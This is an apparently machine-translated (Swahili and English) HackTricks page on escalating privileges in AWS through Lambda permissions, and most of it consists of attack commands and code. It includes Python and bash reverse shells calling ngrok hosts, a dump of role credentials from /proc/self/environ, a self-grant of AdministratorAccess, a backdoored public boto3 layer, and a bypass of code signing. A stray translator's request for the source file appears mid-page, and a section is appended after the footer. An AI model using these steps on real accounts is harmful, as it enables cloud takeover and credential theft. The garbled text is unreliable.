# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

More info about lambda in:

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Watumiaji walio na ruhusa **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction`** wanaweza kuongeza hadhi zao za ruhusa.\
Wanaweza **kuunda Lambda function mpya na kuiweka IAM role iliyopo**, ikimpa function ruhusa zinazohusiana na role hiyo. Mtumiaji anaweza kisha **kuandika na kupakia code kwenye Lambda function hii (kwa mfano na rev shell)**.\
Mara function itakapowekwa, mtumiaji anaweza **kuamsha utekelezaji wake** na vitendo vilivyokusudiwa kwa kuiita Lambda function kupitia AWS API. Njia hii kwa ufanisi inamruhusu mtumiaji kutekeleza kazi kwa njia isiyo ya moja kwa moja kupitia Lambda function, akifanya kazi kwa ngazi ya upatikanaji uliotolewa kwa IAM role iliyohusishwa nayo.\\

Mshambulizi anaweza kutumia hili vibaya kupata **rev shell na kuiba token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Unaweza pia **abuse the lambda role permissions** kutoka kwa lambda function yenyewe.\
Ikiwa lambda role ingekuwa na permissions za kutosha, ungeweza kuitumia kukupa admin rights:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Pia inawezekana leak the lambda's role credentials bila kuhitaji muunganisho wa nje. Hii itakuwa muhimu kwa **Network isolated Lambdas** zinazotumika kwa kazi za ndani. Ikiwa kuna security groups zisizojulikana zinazochuja au kuzuia reverse shells zako, kipande hiki cha code kitakuwezesha leak credentials moja kwa moja kama output ya lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potential Impact:** Privesc ya moja kwa moja kwa role ya huduma ya lambda yoyote iliyotajwa.

> [!CAUTION]
> Kumbuka kwamba hata kama inaweza kuonekana kuvutia **`lambda:InvokeAsync`** **haituruhusu peke yake** **kuendesha `aws lambda invoke-async`**, pia unahitaji `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Kama katika senario iliyotangulia, unaweza **kujipa ruhusa ya `lambda:InvokeFunction`** ikiwa una ruhusa **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** Privesc ya moja kwa moja kwa role ya huduma ya lambda iliyotajwa.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Watumiaji wenye ruhusa **`iam:PassRole`, `lambda:CreateFunction`, na `lambda:CreateEventSourceMapping`** (na pengine `dynamodb:PutItem` na `dynamodb:CreateTable`) wanaweza kwa njia isiyo ya moja kwa moja **escalate privileges** hata bila `lambda:InvokeFunction`.\
Wanaweza kuunda **Lambda function yenye msimbo haribifu na kuiambatisha role ya IAM iliyopo**.

Badala ya kuiita Lambda moja kwa moja, mtumiaji huandaa au hutumia jedwali la DynamoDB lililopo, akiunganisha na Lambda kupitia event source mapping. Mpangilio huu unahakikisha Lambda function inachochewa kiotomatiki wakati kipengee kipya kinaingizwa kwenye jedwali, iwe kwa kitendo cha mtumiaji au mchakato mwingine, na hivyo kwa njia isiyo ya moja kwa moja kuiita Lambda function na kutekeleza msimbo kwa ruhusa za IAM role iliyopitishwa.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Ikiwa DynamoDB tayari inatumika katika mazingira ya AWS, mtumiaji anahitaji tu **kuanzisha event source mapping** kwa Lambda function. Hata hivyo, ikiwa DynamoDB haitumiki, mtumiaji lazima **kuunda jedwali jipya** lenye streaming imewezeshwa:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Sasa inawezekana **connect the Lambda function to the DynamoDB table** kwa **creating an event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Kwa kuwa Lambda function imeunganishwa na DynamoDB stream, mshambuliaji anaweza **kuchochea Lambda kwa njia isiyo ya moja kwa moja kwa kuamsha DynamoDB stream**. Hii inaweza kufanywa kwa **kuingiza kipengee** kwenye DynamoDB table:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potential Impact:** Privesc ya moja kwa moja kwa role ya huduma ya lambda iliyotajwa.

### `lambda:AddPermission`

Mshambuliaji aliye na ruhusa hii anaweza **kujipa yeye mwenyewe (au wengine) ruhusa yoyote** (hii inaunda sera zinazotegemea rasilimali ili kutoa ufikiaji kwa rasilimali):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Athari Inayowezekana:** privesc ya moja kwa moja kwa role ya service ya lambda kwa kumpa ruhusa ya kubadilisha code na kuikimbia.

### `lambda:AddLayerVersionPermission`

Mshambulizi mwenye ruhusa hii anaweza **kumpa yeye mwenyewe (au wengine) ruhusa ya `lambda:GetLayerVersion`**. Anaweza kufikia layer na kutafuta udhaifu au taarifa nyeti
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Athari Inayowezekana:** Ufikiaji unaowezekana wa taarifa nyeti.

### `lambda:UpdateFunctionCode`

Watumiaji wenye ruhusa **`lambda:UpdateFunctionCode`** wanaweza **kubadilisha msimbo wa Lambda function iliyopo ambayo imeunganishwa na role ya IAM.**\
Attacker anaweza **kubadilisha msimbo wa Lambda ili exfiltrate the IAM credentials**.

Ingawa attacker huenda hana uwezo wa moja kwa moja wa invoke the function, ikiwa Lambda function tayari ipo na inafanya kazi, kuna uwezekano itachochewa kupitia workflows au events zilizopo, hivyo kwa njia isiyo ya moja kwa moja kuwezesha utekelezaji wa msimbo uliobadilishwa.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Athari Inayoweza Kutokea:** Privesc moja kwa moja kwa service role ya lambda inayotumika.

### `lambda:UpdateFunctionConfiguration`

#### RCE kupitia env variables

Kwa ruhusa hizi inawezekana kuongeza environment variables zitakazofanya lambda itekeleze arbitrary code. Kwa mfano, katika python inawezekana kutumia vibaya environment variables `PYTHONWARNING` na `BROWSER` ili kufanya mchakato wa python utekeleze amri zozote:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Kwa lugha nyingine za scripting kuna env variables nyingine unaweza kutumia. Kwa maelezo zaidi angalia subsections za scripting languages katika:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) inakuwezesha kujumuisha **code** katika lamdba function yako lakini **kuihifadhi kando**, hivyo code ya function inaweza kubaki ndogo na **functions kadhaa zinaweza kushiriki code**.

Ndani ya lambda unaweza kuangalia paths kutoka ambako python code inapakiwa kwa function ifuatayo:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Haya ni maeneo:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Utekelezaji

Inawezekana kutumia vibaya ruhusa `lambda:UpdateFunctionConfiguration` ili **kuongeza layer mpya** kwa lambda function. Ili kuendesha code yoyote, layer hii inahitaji kuwa na some **library that the lambda is going to import.** Ikiwa unaweza kusoma code ya lambda, unaweza kubaini hili kwa urahisi; pia kumbuka kuwa inawezekana lambda **tayari inatumia layer** na unaweza **kupakua** layer hiyo na **kuongeza code yako** ndani yake.

Kwa mfano, tuseme lambda inatumia library boto3; hii itaunda local layer yenye toleo la mwisho la library:
```bash
pip3 install -t ./lambda_layer boto3
```
Unaweza kufungua `./lambda_layer/boto3/__init__.py` na **kuongeza backdoor katika global code** (mfano, function ya ku-exfiltrate credentials au kupata reverse shell).

Kisha, zip directory `./lambda_layer` hiyo na **upload the new lambda layer** kwenye account yako (au kwenye account ya mwathirika, lakini huenda huna permissions kwa hilo).\
Kumbuka kwamba unahitaji kuunda python folder na kuweka libraries huko ili ku-override /opt/python/boto3. Pia, layer inahitaji kuwa **compatible na python version** inayotumika na lambda, na ikiwa uta-i-upload kwenye account yako, inapaswa kuwa katika **same region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Sasa, fanya lambda layer iliyopakuliwa **inapatikane kwa akaunti yoyote**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Ambatanisha lambda layer kwenye victim lambda function:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
The next step would be to either **kuitisha function** ourselves if we can or to wait until **inaitwa** by normal means–which is the safer method.

A **more stealth way to exploit this vulnerability** can be found in:

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potential Impact:** Direct privesc to the lambda service role used.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Maybe with those permissions you are able to create a function and execute it calling the URL... but I could find a way to test it, so let me know if you do!

### Lambda MitM

Baadhi ya lambdas zitapokea **taarifa nyeti kutoka kwa watumiaji kupitia parameters.** Ikiwa unapata RCE katika moja ya hizo, unaweza exfiltrate taarifa ambazo watumiaji wengine wanazituma kwa lambda hiyo; angalia kwenye:

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

If a Lambda function enforces code signing, an attacker who can either remove the Code Signing Config (CSC) or downgrade it to Warn can deploy unsigned code to the function. This bypasses integrity protections without modifying the function's IAM role or triggers.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- For Path B, you don't need an AWS Signer profile if the CSC policy is set to `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Tayarisha payload ndogo:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Njia A) Ondoa CSC kisha sasisha code:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Njia B) Punguza kuwa Warn na sasisha msimbo (ikiwa kufuta hakuruhusiwi):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Tafadhali tuma maudhui ya faili (src/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc.md) ili niweze kuyatafsiri kwa Kiswahili. Nitahifadhi markdown, tags, links, code, na paths bila kutafsiri.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Athari inayowezekana: Uwezo wa kusukuma na kuendesha arbitrary unsigned code katika function ambayo ilipaswa kutekeleza signed deployments, na hivyo kupelekea code execution kwa kutumia function role's permissions.

Usafishaji:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

